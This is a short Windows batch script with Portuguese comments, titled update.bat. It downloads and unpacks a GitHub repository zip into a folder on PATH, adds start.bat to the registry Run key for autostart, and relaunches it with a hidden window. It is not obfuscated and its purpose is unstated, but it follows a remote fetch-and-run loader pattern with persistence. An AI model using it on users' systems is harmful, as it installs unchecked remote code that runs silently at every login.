@ECHO OFF
Title update.bat
::baixa os arquivos do repositório hospedado no github
powershell "Invoke-WebRequest -OutFile '%localappdata%\Microsoft\WindowsApps\main.zip' -Uri https://github.com/hulaneoTi/testes/archive/refs/heads/main.zip"
::descompacta o arquivo baixado
powershell "Expand-Archive -Path '%localappdata%\Microsoft\WindowsApps\main.zip' -DestinationPath '%localappdata%\Microsoft\WindowsApps' -Force"
::lê todos os arquivos da pasta descompactada e salva numa lista em txt
dir /b %localappdata%\Microsoft\WindowsApps\testes-main > %localappdata%\Microsoft\WindowsApps\list.txt
::move os arquivos para pasta superior (que está naturalmente no PATH)
move %localappdata%\Microsoft\WindowsApps\testes-main\*.* %localappdata%\Microsoft\WindowsApps
::verifica se no registro tem a entrada do start.bat, se não tiver o adiciona ao registro do windows para inicializar com o sistema
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v start 2>nul
if %errorlevel% neq 0 (
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v start /t REG_SZ /d %localappdata%\Microsoft\WindowsApps\start.bat /f
)
::encerra o start.bat
WMIC PROCESS WHERE "COMMANDLINE LIKE '%start.bat%'" CALL TERMINATE
::chama start.bat
powershell "start start.bat -WindowStyle Hidden"